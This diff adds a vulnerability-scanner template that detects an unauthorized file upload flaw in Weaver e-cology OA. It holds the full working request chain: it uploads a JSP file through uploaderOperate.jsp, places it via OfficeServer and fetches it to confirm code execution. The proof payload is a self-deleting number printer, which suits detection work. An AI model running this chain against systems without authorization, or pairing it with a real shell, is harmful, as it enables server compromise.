@@ -1,0 +1,75 @@
+id: weaver-e-cology-oa-file-upload
+info:
+  name: Weaver e-cology OA File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Vulnerability in Weaver e-cology OA allowing unauthorized file upload.
+    Exploits multiple paths to upload and verify a JSP shell file.
+  reference:
+    - https://planet.vulbox.com/detail/MTEwMjk=
+variables:
+  s1: "{{rand_text_alpha(20)}}"
+  s2: "{{rand_int(10000000, 90000000)}}"
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/workrelate/plan/util/uploaderOperate.jsp"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
+    body: |
+      ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+      Content-Disposition: form-data; name="secId"
+      
+      1
+      ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+      Content-Disposition: form-data; name="Filedata"; filename="{{s1}}.jsp"
+      
+      <% out.println("{{s2}}"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+      ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+      Content-Disposition: form-data; name="plandetailid"
+      
+      1
+      ------WebKitFormBoundaryVdb2RRl25PuaGhWj--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "fileid="
+    extractors:
+      - type: regex
+        name: fileid
+        part: body
+        internal: true
+        regex:
+          - "fileid=(.+?)>"
+  - id: insert-image
+    method: POST
+    path:
+      - "{{BaseURL}}/OfficeServer"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
+    body: |
+      ------WebKitFormBoundaryVdb2RRl25PuaGhWj
+      Content-Disposition: form-data; name="aaa"
+      
+      {"OPTION":"INSERTIMAGE","isInsertImageNew":"1","imagefileid4pic":"{{fileid}}"}
+      ------WebKitFormBoundaryVdb2RRl25PuaGhWj--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{s2}}"
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/{{s1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{s2}}"
